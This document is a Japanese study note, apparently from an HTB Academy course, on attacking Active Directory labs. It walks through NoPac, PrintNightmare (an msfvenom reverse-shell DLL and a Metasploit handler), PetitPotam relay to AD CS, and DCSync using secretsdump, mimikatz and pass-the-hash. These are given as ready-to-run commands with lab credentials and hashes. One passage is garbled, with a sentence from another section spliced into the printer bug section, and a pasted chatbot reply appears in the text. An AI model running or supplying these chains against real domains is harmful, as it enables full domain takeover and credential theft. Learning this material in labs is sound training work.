を使ったMSSQLインスタンスの列挙

PowerShellと同じMSSQLインスタンスの列挙をLinux上で実行できる
ターゲットへの権限付きアクセスコマンド
```shell-session
snowyowl644@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
```

**enable_xp_cmdshell**
有効化
```shell
SQL> enable_xp_cmdshell
```

現在のユーザーが持っているシステム上の特権を列挙
```shell-session
xp_cmdshell whoami /priv
```

## Kerberos「ダブルホップ」問題
- Kerberos認証を2回以上にわたって利用しようとしたときに発生する問題として、通称「ダブルホップ」問題がある
https://academy.hackthebox.com/module/143/section/1573
そもそもダブルホップ問題とは
> Kerberosは「チケット方式」だから安全だけど、その分セッション内に再利用できる認証情報（パスワード相当）がないので、ログイン先で「再度どこかにアクセスしようとすると」認証できなくなる

発生しやすい場所と事象
- 「ダブルホップ」問題は、特にWinRMやPowerShellを使う場合に顕著に表れる
- リモートシェルからファイル共有にアクセスしようとした際に、権限があるはずのユーザーアカウントなのにアクセスが拒否される、という状況が起こる

押さえておくべきこと
- Kerberosチケットはパスワードの代わりではない
- KDC（Key Distribution Center）が発行する署名付きのデータで、アカウントがどのリソースにアクセスできるかを示すもの
- Kerberosで認証を行うと、その時点でアクセスを要求した特定のリソース（たとえば一台のマシン）へのアクセスを許可する「チケット」が発行される

問題の核心
- WinRMを使って2回以上のリモート接続を行おうとする場合、ユーザーのパスワード（NTLMハッシュ）はログインの過程でキャッシュされません。つまり、セッション内にパスワード情報が残らない⇨だから、リモート接続先でパスワードを読み出せなくて、認証できない。

対策
- Kerberos認証先で、PSExecなどでパスワード認証を使うと、そのNTLMハッシュがセッションに保存され、別のリソースにアクセスする際にマシンがメモリからその情報を取得して再認証を行うことができる

もちろん！要点を見やすく 入れ子式の箇条書き でまとめますね。重要なポイントだけをピックアップしてます：

 Kerberos ダブルホップ問題の要点
	•	Kerberos認証はチケットベース
	•	認証時に使われるのはパスワードではなく「チケット（TGT/TGS）」
	•	セッションに NTLMハッシュやパスワードは残らない
	•	⇒ 2ホップ目のアクセス時、再認証できない

evil-winrm や PowerShell Remoting を使うと発生しやすい
•	Network Logon のため、認証情報がメモリに残らない
•	PowerViewなどでドメインを列挙しようとしても認証に失敗
	•	TGTが送られないため、DCに対して「正体」を証明できない

認証フローの違いがカギ
•	TGSは送られるが、TGTは送られない
	•	コマンド実行はできるが、その先へのアクセスがブロックされる
•	⇒ 2台目のサーバーにアクセスできない（ダブルホップ問題）

Unconstrained Delegation（無制限委任）が有効なら問題なし
•	TGTも一緒に渡される
•	ターゲットホストがユーザーの代わりに他のサーバーにアクセス可能
	•	＝「この人本物です」って代わりに言える状態
•	この状態を踏めたらほぼ勝ち（横展開し放題）

 回避策（Workarounds）
•	ネストした Invoke-Command
	•	PSCredential オブジェクトを使って明示的に認証情報を渡す
	•	攻撃元 → ホストA → ホストB に行く際に使える
•	使い分け
	•	evil-winrm セッション → スクリプトで対処
	•	GUIアクセスあるWindowsホスト → 普通にPowerShellで回避策実行可能


### 回避策

**回避策①：PSCredential オブジェクトを使う方法**

• evil-winrmなどでWinRMセッションに接続すると、認証情報はメモリに残らない
• そのため、ドメインコントローラー（DC）に対して再認証できず、PowerViewなどのツールが使えない
• klist で確認すると、接続先（DEV01）に対するTGSしかキャッシュされていない
• ユーザーのTGT（元になるチケット）は送られていない
• 対処法
- ConvertTo-SecureString と PSCredential を使って認証情報を作成し、
• PowerViewコマンドに -credential パラメータで渡す
例
```
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
get-domainuser -spn -credential $Cred
```

• 成功すると、SPNの一覧が取得できる
• 逆に -credential をつけずに再実行すると、またエラーになる
• 補足
	• RDPで直接ホストにログインした場合は、パスワードがメモリにあるため、TGTもキャッシュされていて問題なし

**回避策②：PSSession構成を登録する方法（GUI PowerShell限定）**
• ドメイン参加ホストやWindows攻撃ホストから、Enter-PSSession でWinRM接続する場合に使える
• 通常のWinRM接続では、HTTPサービス用のTGSしか取得されず、DCへはアクセスできない
• 対処法
	• Register-PSSessionConfiguration を使って、セッション構成を登録し、指定ユーザーでRunAsする
• WinRMサービスを再起動する必要あり（その後セッション再接続）
例
```
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
Restart-Service WinRM
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName backupadmsess
```
• この方法では、ローカルホストがリモートホストの代わりにドメインリソースへアクセスできるようになる
• TGTチケットがキャッシュされ、PowerViewなども認証情報なしで実行できる

**注意点と制限**
• evil-winrmセッションでは Register-PSSessionConfiguration は使えない
• GUIによる資格情報入力が必要なため
• RunAsは昇格済みPowerShellでのみ動作する
• Linux（Parrot、Ubuntu）上のPowerShellでもこの方法は動作しない（Kerberos連携の制限あり）
• 使える環境
	• Windows上の攻撃用ホスト、またはRDPでアクセス可能な侵害済みホスト

**その他の手法（今回は未解説）**
• CredSSP
• ポートフォワーディング
• サクリフィシャルプロセス（ターゲットユーザーのプロセスへのインジェクション）

## 最先端の脆弱性
- パッチ管理や更新サイクルに関して、多くの企業はネットワーク全体へのパッチ適用を迅速に行えていません。
- こうした状況を突いて、比較的新しい手法を使えば、初期侵入やドメイン権限の昇格といった「早期の成果」を狙える可能性がある
- このセクションで紹介する3つのテクニックは、執筆時点（2022年4月）で登場から6〜9ヶ月程度の、比較的新しいもの

### NoPac (Sam_The_Admin 脆弱性)
- SamAccountName Spoofing（なりすまし）」と呼ばれる手法がある
- 2021年末に公表されたもので、CVE-2021-42278とCVE-2021-42287という2つの脆弱性を組み合わせた攻撃
- 通常のドメインユーザーから、たった1つのコマンドでドメイン管理者（Domain Admin）権限に昇格できてしまう

| **42278**                     | **42287**                                                       |
| ----------------------------- | --------------------------------------------------------------- |
| セキュリティアカウントマネージャ（SAM）のバイパス脆弱性 | Kerberosの特権属性証明書（PAC）に関する脆弱性（Active Directory Domain Services内） |
- コンピュータアカウントのSamAccountName（アカウント名）を、ドメインコントローラー（DC）の名前に変更できる点を悪用する
- 既定では、認証済みユーザーは最大10台までのコンピュータをドメインに参加させることができる
	- そこで、新しく追加するホストの名前を、既存のDCのアカウント名に合わせて変更する
		- この状態でKerberosチケットをリクエストすると、サービスはDCの名前としてチケットを発行してしまう
			- チケット発行時には、名前が最も近いアカウントが選ばれるため
		- このチケットを使えば、DCの権限で操作できるようになり、最終的にはドメインコントローラー上でSYSTEMシェルを取得することも可能になる


NoPacのgitのクローン
```shell-session
snowyowl644@htb[/htb]$ git clone https://github.com/Ridter/noPac.git
```

スキャナとエクスプロイトツールがある
スキャンして、実際に脆弱だったらエクスプロイトの実行をする
```shell-session
snowyowl644@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```

出力結果 
- ドメインユーザーが新しいマシンアカウントを最大10個まで追加できる状態。NoPacではこれが必要。0になってるとアウトだけど、10なのでOK。
- KerberosのTGT（チケット）を**PAC付きで取得できてる**。これが取れてる＝CVE-2021-42278 + 42287の悪用準備が完了してるってこと。

NoPac 実行と SYSTEMシェルの取得
- 脆弱性が確認できたら、次は noPac.py を使って SYSTEM 権限のシェルを取得する
	- コマンドラインで、組み込みの Administrator アカウントをなりすまし、ターゲットのドメインコントローラー上にセミインタラクティブなシェルを開く
	- 比較的「騒がしい」（ログなどに目立ちやすい）ため、アンチウイルスやEDR（エンドポイント検知＆応答）によって検出・ブロックされる可能性もある

smbexec.py を通じてセミインタラクティブシェルを確立する
- cdコマンドでディレクトリを移動することができないため、パスをフル指定してコマンドを実行する必要がある
noPac.py は、攻撃を実行したホストのカレントディレクトリ内に TGT チケットを保存する
```shell-session
snowyowl644@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
- -dump フラグを指定することで、secretsdump.py を使って DCSync を実行できる
- .ccache ファイルはディスク上に作成されるため、証拠を残さないように注意してクリーンアップを行う必要がある

**NoPacを使ってAdministratorアカウントをDCSyncする**
- 組み込みの Administrator アカウントになりすまして、ドメインコントローラーからハッシュやKerberosキーなどの重要な認証情報をダンプすることができる
	- DCSync 攻撃の一種で、対象アカウントに対してのみ行う「just-dc-user」オプションを利用している
	- DRSUAPI（Directory Replication Service API）を使って、Active Directory データベース（NTDS.dit）から認証情報を取得する
```shell-session
snowyowl644@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```
- 取得できるもの
	- NTLM ハッシュ
	- AES および DES 形式の Kerberos キー
- もしターゲット環境に Windows Defender や他のウイルス対策ソフト、EDR（エンドポイント検知・対応）が有効になっている場合、シェルセッション自体は確立できても、コマンドの実行はブロックされることが多い

実際の処理
smbexec.py は、コマンド実行のために以下のような処理を行う
1.	最初に BTOBTO というサービスを作成
2.	続けて BTOBO というサービスを作成
3.	入力したコマンドを .bat ファイル（execute.bat）に書き込み、SMB経由で送信
4.	実行後、ファイルを削除
つまり、すべてのコマンドは一時的なバッチファイルとして実行される仕組み

**OPSEC（作戦上の安全）を重視する場合の対策**
- 「静かに動くこと」（＝検出回避）が求められる場合は、smbexec.py のようなツールは避けた方が良い
	- 技術的な手法や戦術の習得にある

### PrintNightmare
- すべてのWindows OSに搭載されているプリントスプーラーサービスの脆弱性（CVE-2021-34527 および CVE-2021-1675)
- 脆弱性に基づいた複数のエクスプロイトが存在しており、権限昇格やリモートコード実行（RCE）を実現できる
- この脆弱性を利用したローカル権限昇格については「Windows Privilege Escalation」モジュールで取り扱っている
- Active Directory 環境でリモートアクセスを得る方法としても非常に重要です。ここでは、Windows Server 2019 上で動作しているドメインコントローラーに対して、SYSTEMシェルを取得するための一例として、PrintNightmareエクスプロイトの実践を行う

エクスプロイトの取得
```shell-session
snowyowl644@htb[/htb]$ git clone https://github.com/cube0x0/CVE-2021-1675.git
```

cube0x0版 Impacket のインストール
```shell-session
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

Print Spooler サービスの脆弱性調査
- ターゲットのドメインコントローラーに対して、RPC サービスが該当プロトコル（MS-RPRN と MS-PAR）を公開しているかどうかを rpcdump.py を使って確認する
```shell-session
snowyowl644@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
```

DLLペイロードの作成
- DLL形式のペイロードを読み込ませる形で実行される
- Metasploit の msfvenom を使って DLL ペイロードを作成する
	- ここでは、ターゲットからリバース接続を受ける Meterpreter セッション（reverse TCP）を仕込む
```shell-session
snowyowl644@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

smbserver.py を使ってペイロードを共有
- 作成した DLL をターゲットに提供するため、攻撃ホスト側で SMB サーバを立ち上げる
- Impacket の smbserver.py を使って、ペイロードを含む共有ディレクトリを公開する
```shell-session
snowyowl644@htb[/htb]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

Metasploit で multi/handler を起動
- Metasploit を起動し、multi/handler モジュールを使って、ターゲットからのリバースシェル接続を待ち受けるように設定する
```shell-session
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
```

エクスプロイトの実行
- ペイロードがホストされ、Metasploit 側も待機状態になったら、いよいよエクスプロイトをターゲットに対して実行
- 指定されたコマンドで、ターゲットに対してDLLを読み込ませ、Meterpreterセッションを確立させることが目的
```shell-session
snowyowl644@htb[/htb]$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```
ドメインコントローラーに対して SYSTEM 権限でのリモートアクセスが可能になる
ただし、成功には複数の条件（DLLの共有、プロトコルの露出、正しいImpacketの使用など）が揃っている必要があるため、各ステップを丁寧に確認しながら進める

SYSTEMシェルの取得
- エクスプロイトが成功すると、Meterpreter のセッションが開始されます。そこからシェルを開き、whoami コマンドを実行することで、取得した権限が NT AUTHORITY\SYSTEM であることを確認できる
- 通常のドメインユーザーアカウントから、ドメインコントローラー上で SYSTEM レベルのシェルを取得することが可能
```shell-session
[*] Sending stage (200262 bytes) to 172.16.5.5
[*] Meterpreter session 1 opened (172.16.5.225:8080 -> 172.16.5.5:58048 ) at 2022-03-29 13:06:20 -0400

(Meterpreter 1)(C:\Windows\system32) > shell
Process 5912 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### PetitPotam (MS-EFSRPC)
- PetitPotam（CVE-2021-36942）は、LSA（Local Security Authority）の認証なりすまし（spoofing）を可能にする脆弱性で、2021年8月に修正パッチが公開されている
- この脆弱性は、Microsoft の Encrypting File System Remote Protocol（MS-EFSRPC）を悪用して、認証されていない攻撃者がドメインコントローラーに別ホストへの NTLM 認証を強制させることを可能にする（ポート445経由のLSARPCを使用）
- この手法で、Active Directory Certificate Services（AD CS）が導入されている環境では、Windows ドメインの乗っ取りが可能になる

攻撃の流れ
1.	ドメインコントローラーに、認証要求を強制送信（PetitPotamによるNTLMリレー）
2.	そのリクエストを中継して、CA（証明機関）のWeb Enrollmentページにアクセス
3.	新しい証明書の発行を申請（CSR）
4.	取得した証明書を使って、TGTを取得（Rubeusやgettgtpkinit.pyを利用）
5.	最終的に、DCSync攻撃によりドメイン全体の認証情報を取得

**(攻撃の準備（ntlmrelayxの起動）**
- まず、攻撃ホストの1つのターミナルで ntlmrelayx.py を起動する
- このとき、ターゲットに中継させたい先（CAホストのWeb EnrollmentのURL）を指定し、テンプレートとして DomainController を選択する

```shell-session
snowyowl644@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

**PetitPotamの実行**
- 次に、別のターミナルで PetitPotam.py を実行
- ターゲットのドメインコントローラーに対して MS-EFSRPC 経由で偽のファイルアクセスを試み、その過程で NTLM 認証を強制する
```shell-session
snowyowl644@htb[/htb]$ python3 PetitPotam.py 172.16.5.225 172.16.5.5       
```

以下のバリエーションも存在する
**Mimikatz版**
```sh
misc::efs /server:<DC> /connect:<攻撃ホスト>
```

**DC01のBase64エンコード証明書をキャッチする**
- 別のターミナルで起動していた ntlmrelayx.py のウィンドウを見ると、攻撃が成功した場合、ターゲットのドメインコントローラー（ここでは ACADEMY-EA-DC01）からの認証がリレーされ、CA（証明機関）へのアクセスが成功していることが確認できる
- 認証に成功すると、証明書の署名リクエスト（CSR）が生成され、それに基づいてドメインコントローラー用の証明書が発行されます。この証明書は **Base64形式** で出力され、ログに表示されます。これは非常に重要な成果物で、この後のKerberos関連攻撃に利用される

```shell-session
snowyowl644@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

**gettgtpkinit.pyを使ってTGTを取得する**
- 別のターミナルで起動していた ntlmrelayx.py のウィンドウを見ると、攻撃が成功した場合、ターゲットのドメインコントローラー（ここでは ACADEMY-EA-DC01）からの認証がリレーされ、CA（証明機関）へのアクセスが成功していることが確認できる
- 認証に成功すると、証明書の署名リクエスト（CSR）が生成され、それに基づいてドメインコントローラー用の証明書が発行される
- 出力された .ccache ファイル（この例では dc01.ccache）には、TGTが保存されており、Kerberos 認証時の「身分証明」として使える
```shell-session
snowyowl644@htb[/htb]$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```

**KRB5CCNAME環境変数の設定**
- Kerberosツールがこのチケットを認識できるように、KRB5CCNAME 環境変数に .ccache ファイルのパスを指定する
- この設定によって、以後のKerberosベースの操作（例：secretsdump.py など）は、このTGTを使って認証を行う
```shell-session
snowyowl644@htb[/htb]$ export KRB5CCNAME=dc01.ccache
```

**ドメインコントローラーのTGTを使ってDCSyncを実行**
- dc01.ccache ファイルにTGTが保存されていれば、secretsdump.py を使って DCSync を実行できる
- これにより、ドメイン内のユーザー（特定の1人でも、全員でも）の NTLMハッシュ を取得可能になる
- -k オプションはKerberos認証を、-no-pass はパスワードを不要とする設定で、.ccache ファイルに保存されているTGTを使用する
- 現在のKerberosチケットの状態は、klist コマンドで確認できる
	- krb5-user パッケージが必要ですが、ラボのATTACK01にはすでにインストール済み
```shell-session
snowyowl644@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

**ドメインコントローラーへの管理者アクセスの確認**
- 取得済みのAdministratorアカウントのNTLMハッシュを使用して、ドメインコントローラーにアクセスできるかを crackmapexec で確認する
```shell-session
snowyowl644@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```
成功すると、「Pwn3d!」の表示が出て、ターゲットへの完全なアクセスが確立される
- 永続的なアクセスの確立（バックドアなど）
- 機密情報の収集
- 誤設定や脆弱性の調査
- トラスト関係の列挙

**getnthash.py を使ったNTハッシュの取得（U2U）**
- 別の手法として、TGT（チケット授与チケット）を入手したあとに、getnthash.py ツールを使って対象ホスト（またはユーザー）の NTハッシュ を取得することもできる
- Kerberos の **User-to-User 認証（U2U）** を使って、自分自身へのTGS（サービスチケット）をリクエストし、PAC（特権属性証明）からNTハッシュを復号する
- TGT取得時に得られた **AS-REPの暗号化キー** が必要
```shell-session
nowyowl644@htb[/htb]$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```

**ドメインコントローラーのNTハッシュを使ってDCSync**
- 取得したNTハッシュを使えば、次のようにして secretsdump.py による DCSync 攻撃を行うことができる
```shell-session
snowyowl644@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```
このコマンドにより、対象アカウントの以下のような情報がダンプされる
- NTLMハッシュ
- Kerberos AESキー（256bit/128bit）
- DESキー
これで、ドメインの最上位権限を完全に掌握できる

**Rubeusを使った代替手法（Windows環境）**
- もしこの攻撃をWindowsの攻撃ホスト上で行う場合は、Rubeus というツールを使うことで、同じTGTの取得と Pass-the-Ticket（PTT）攻撃 を一度に実行することが可能
- ポイント：Base64で取得した証明書をRubeusに読み込ませる
- この操作を行うには、他のセクションで登場する MS01 攻撃ホスト（Windowsベース） が必要になります（たとえば「ACL Abuse Tactics」や「Privileged Access」セクションなど）。Base64証明書を事前に保存しておき、Rubeusで使用することで同様の結果が得られる

**DC01$ マシンアカウントでTGTを要求し、PTTを実行する**
- ntlmrelayx.py でBase64形式の証明書を取得した後、Windowsの攻撃ホストで Rubeus ツールを使用する
- TGT（チケット授与チケット）を要求し、そのまま Pass-the-Ticket（PTT）攻撃 を行うことができる

PowerShell から次のようにRubeusを実行する
```powershell-session
PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
```

TGTがメモリに存在するかを確認する
- TGTが正常に読み込まれているかどうかは、klist コマンドで確認できる
```powershell-session
PS C:\Tools> klist
```

**Mimikatzを使ったDCSync攻撃の実行（Windows上）**
- ドメインコントローラーは通常、ドメイン内の認証情報の複製（レプリケーション）権限を持っている
- PTTでTGTをインポートしていれば、そのチケットを使って DCSync攻撃 を実行することができる
krbtgt アカウント（Kerberosのコアアカウント）のNTLMハッシュを取得する例
```powershell-session
PS C:\Tools> cd .\mimikatz\x64\
PS C:\Tools\mimikatz\x64> .\mimikatz.exe
mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
```

**PetitPotam 対策（Mitigations）**
- この攻撃チェーンの中核にある **PetitPotam（CVE-2021-36942）** への対策として、以下のような対処が推奨
基本的な対策
- CVE-2021-36942 のパッチ適用（対象ホストすべてに）
強化策（ハードニング）
- AD CSのWebサービスに対し、**拡張認証保護（EPA）とSSL強制（HTTPS限定）**を有効にする
- ドメインコントローラーで NTLM認証を無効化
- AD CSサーバー（IIS）でNTLMを無効化（GPOやIIS設定で）
- AD CS全体でNTLM利用を制限・禁止する

## その他の設定ミス

### Microsoft Exchangeに関連するグループメンバーシップ
- Active Directory環境での**Microsoft Exchange**の導入
	- ドメイン内で非常に強い権限を持つため、さまざまな攻撃の入り口が生まれる
	- Exchangeに関連するユーザー、グループ、アクセス制御リスト（ACL）によって、多くの権限が与えられているから

珍しくない設定ミス
- 「Exchange Windows Permissions」グループ
	- 保護されたグループとして扱われてはいませんが、ドメインオブジェクトに対してDACL（Discretionary Access Control List）を書き込む権限を持っているため、これを利用して任意のユーザーに「DCSync」権限を付与することが可能
	- 攻撃者は、DACL設定ミスを利用するか、もしくは「Account Operators」グループに所属するアカウントを乗っ取ることで、このグループに新たなメンバーを追加できる
	- 「Exchange Windows Permissions」を悪用してAD環境で権限昇格を行う手法 : https://github.com/gdedrouas/Exchange-AD-Privesc

- 「Organization Management」グループ
	- 非常に強力な権限を持つグループで、Exchangeの世界では実質的に「Domain Admins」に相当
	- このグループに所属していれば、ドメイン内のすべてのユーザーのメールボックスにアクセスすることができる
	- このグループは「Microsoft Exchange Security Groups」というOU（組織単位）に対して完全なコントロール権限を持っている
		- その中には前述の「Exchange Windows Permissions」グループも含まれている

Organization Managementの権限の確認
![](https://i.imgur.com/KNibOEx.png)

- Exchangeサーバーを乗っ取ることができれば、高い確率で**Domain Admin（ドメイン管理者）権限**までたどり着くことが可能
- Exchangeサーバー上でメモリ内の認証情報をダンプすると、**数十件から場合によっては数百件もの平文パスワードやNTLMハッシュ**が取得できることもある
	- 多くのユーザーがOutlook Web Access（OWA）を使用してログインしており、その際にExchangeが認証情報をメモリ上にキャッシュしてしまうことが原因

### PrivExchange攻撃
- Exchange ServerのPushSubscription機能の設計ミスに起因する攻撃
- この機能は、本来メール通知のためのものですが、ドメイン内の任意のユーザー（メールボックス付き）がExchangeサーバーにHTTP経由で任意のホストへの認証を強制させることができる
- Exchangeサービスは**SYSTEM権限で動作**し、かつデフォルトでは必要以上の権限（例：DomainオブジェクトへのWriteDACL権限）を持っているため、この脆弱性を悪用するとLDAPへのリレー攻撃を通じて**NTDS（Active Directoryのデータベース）をダンプ**することが可能になる
- もしLDAPにリレーできない場合でも、他のドメイン内ホストへ認証をリレーすることは可能
	- ドメインユーザー権限さえあれば、直接Domain Adminに昇格できる

### プリンタバグ
- このプロトコルは、クライアントとプリントサーバー間の通信（印刷処理・管理）を定義している
- 「Printer Bug」は、**MS-RPRN（Print System Remote Protocol）**の設計上の問題により発生する脆弱性
- 攻撃に利用するには、ドメイン内の任意のユーザーがプリントスプーラーの名前付きパイプに接続し、下のような一連のRPC呼び出しを実行することで、ターゲットサーバーに対し**SMB経由で任意ホストへの認証を強制**させることができる
	- `RpcOpenPrinter` → `RpcRemoteFindFirstPrinterChangeNotificationEx`
- スプーラーサービスはSYSTEM権限で実行さつまり、偽のPACを作成して、「自分はDomain Adminの一員だ」と偽装することができれており、Windows ServerのDesktop Experienceエディションでは標準で有効になっている
- この脆弱性を利用すると、LDAPに対してリレー攻撃を行い、攻撃者のアカウントに**DCSync権限**を付与することで、Active Directoryから全ユーザーのパスワードハッシュを取得することが可能
	- LDAP認証をリレーし、**Resource-Based Constrained Delegation（RBCD）の権限を被害者ユーザーに付与させ、攻撃者の制御下にあるコンピューターアカウントを使って、被害者マシン上で任意のユーザーになりすまし**てログインすることも可能
- この攻撃手法は、すでに一方のフォレスト／ドメインに対して管理者権限を持っている場合に、信頼関係（トラスト）を利用して別のフォレストにあるドメインコントローラー（DC）を乗っ取ることにも使える
	- （ただし、現在ではTGT委任はデフォルトで無効）
- 対象マシンがMS-RPRN Printer Bugの影響を受けるかどうかは、対象環境に用意されている Get-SpoolStatus モジュールやその他のツールを使って確認可能
- この脆弱性は、Unconstrained Delegation（無制限の委任）が有効な別フォレストのホスト（例えば別ドメインのDC）を狙って攻撃を展開する際にも利用できます。つまり、**フォレスト間の信頼関係をまたいだ攻撃**にも活用できる

### MS14-068
- この脆弱性は、Kerberosプロトコルの欠陥に起因するもの
- 通常のドメインユーザーの認証情報を使って**ドメイン管理者（Domain Admin）権限に昇格**できてしまうという問題
- Kerberosチケットには、ユーザー名、ID、所属グループなどの情報が**PAC（Privilege Attribute Certificate）**という形式で含まれている
- PACは、KDC（Key Distribution Center）によって署名され、改ざんされていないことが確認される
- この脆弱性を悪用すると**偽造したPACをKDCに正規のものとして受け入れさせることが可能**になる
- つまり、偽のPACを作成して、「自分はDomain Adminの一員だ」と偽装することができる
- 実行できるツール
	- PyKEK（Python Kerberos Exploitation Kit）・Impacket
- 防御手段として有効なのは、**パッチの適用のみ**


### LDAP認証情報のスニッフィング
- 多くのアプリケーションやプリンタは、ドメイン接続のためにLDAPの認証情報をWeb管理コンソールに保存している
- 初期設定のまま（弱いパスワードなど）で放置されていることも多く、**平文で認証情報が見られる場合もある**
- アプリケーションによっては「接続テスト」機能があり、**LDAP接続先のIPアドレスを攻撃者のマシンに変更**し、**LDAPのポート389でNetcatを待ち受け状態にする**ことで、テスト接続の際に**認証情報を攻撃者側に送信**させることができる
	- この時、しばしば認証情報は**平文で送信される**
- LDAP接続に使用されるアカウントは、高権限を持っている場合もありますし、そうでなくてもドメイン内での足がかりとして有効
- この攻撃を成立させるには、**フル機能のLDAPサーバーが必要になるケースもある**
- 詳細 : https://grimhacker.com/2018/03/09/just-a-printer/

### DNSレコードの列挙
- **adidnsdump**というツールを使うと、有効なドメインユーザーアカウントを用いて、そのドメイン内のすべてのDNSレコードを列挙することができる
- 特に、BloodHoundなどのツールでホスト名が「SRV01934.INLANEFREIGHT.LOCAL」のように無意味な名前ばかりだと、どこを攻撃すればいいか判断しづらい
- しかし、DNSレコードを参照することで、たとえば「JENKINS.INLANEFREIGHT.LOCAL」といった**有用なサービス名のヒントを得る**ことができる
- このツールが有効なのは、**デフォルトではすべてのユーザーがDNSゾーンの子オブジェクトを閲覧できる**ため
- LDAP経由でDNSレコードを取得しようとしても、通常は完全な情報は返ってこない
- adidnsdumpを使うことで、ゾーン内のすべてのレコードを抽出し、**攻撃に役立つ情報を見つけ出すことが可能**になる

adidnsdumpを使ってみる
- -r オプションを付けて不明レコードを解決する
```sh
snowyowl644@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```

解決済みの records.csv の内容
- adidnsdumpコマンドで￼`-r`￼￼オプションをつけることで、全てのIPがわかる
- 見つけづらいホストの情報が**隠れレコードとして現れることがある**ため、**大規模な環境では必ず実行してみる価値がある**
```shell-session
snowyowl644@htb[/htb]$ head records.csv 

type,name,value
A,LOGISTICS,172.16.5.240
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29
```

### 説明欄に書かれたパスワード
- ユーザーアカウントの「説明（Description）」や「メモ（Notes）」欄に、**パスワードのような機密情報が書かれていることがある**
- PowerViewを使うことで列挙できる
- 特に大規模なドメインでは、このような機密情報を**CSVファイルにエクスポートして後でオフラインで調査するのが効果的**

**Get-DomainUserで説明欄からパスワードを探す例**
- ldap.agentの部分にパスワードが書かれている
```powershell-session
PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

samaccountname description
-------------- -----------
administrator  Built-in account for administering the computer/domain
guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
```

### PASSWD_NOTREQDフラグの設定
- userAccountControl 属性に **PASSWD_NOTREQD** フラグが設定されているアカウントが存在することがある
- このフラグが有効だと、そのアカウントは現在のパスワードポリシー（長さや複雑さなど）を**適用されない状態**になる
- つまり、**短いパスワードや、極端な場合はパスワードが空でも許される**可能性がある
- また、一部の**ベンダー製品がインストール時にこのフラグを付けて放置するケース**もある
- このフラグがあるからといって必ずしもパスワードが設定されていないとは限りませんが、**チェックしておく価値は大いにある**

Get-DomainUserでPASSWD_NOTREQDを確認する
- `PASSWD_NOTREQD`が書いてある
```powershell-session
PS C:\htb> Import-Module .\PowerView.ps1
